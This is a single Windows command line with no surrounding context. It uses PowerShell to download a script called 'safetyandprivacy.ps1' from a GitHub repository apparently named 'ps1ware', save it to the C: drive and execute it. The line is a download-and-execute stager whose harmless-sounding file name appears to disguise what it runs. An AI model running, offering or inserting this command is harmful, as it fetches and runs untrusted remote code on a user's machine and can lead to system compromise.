cmd /c "powershell -Command \"(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/s-b-repo/ps1ware/main/safetyandprivacy.ps1', 'C:\safetyandprivacy.ps1'); Start-Process 'powershell' -ArgumentList 'C:\safetyandprivacy.ps1'\""